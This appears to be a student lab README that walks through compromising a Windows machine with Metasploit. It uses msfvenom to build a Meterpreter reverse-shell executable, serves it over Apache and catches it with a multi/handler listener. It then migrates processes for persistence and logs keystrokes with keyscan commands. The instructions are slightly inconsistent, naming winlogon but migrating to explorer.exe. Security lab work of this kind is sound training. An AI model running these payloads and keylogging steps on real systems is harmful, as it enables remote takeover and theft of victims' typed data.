# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![6 1](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/039f0306-f81e-426d-bb48-bf8a9bfbd7b0)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

![6 2](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/077982a5-1e45-4117-8d6d-2518b6056789)


copy the fun.exe into the apache /var/www/html folder

![6 3](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/2a900dce-2280-4726-a54a-0ec65218bb96)


Start apache server sudo systemctl apache2 start

![6 4](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/77fc6863-c55b-4535-bbe6-54191f81b51e)


Check the status of apache2

![6 5](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/3748e7fc-dc4a-4bef-a650-50766046dfdc)


Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![6 6](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/4e0dd840-ee7d-49f3-876b-4dfa1d9065ab)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![6 7](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/cbf2c357-5c03-4cef-a917-9a0f0fc59ed1)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![6 8](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/72b28c90-2645-47ac-8799-d812b2663f1e)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![6 9](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/04b7f686-ad7e-4a0b-952d-18d4216526eb)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![6 10](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/b1431aec-5173-4b18-811f-e74ba4abcebd)


keyscan_dump Shows the keystrokes captured so far

![6 11](https://github.com/keerthanaa10/Compromising-windows-using-Metasploit/assets/132996371/a81072c2-8943-41c8-89e9-4cc57be3f582)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
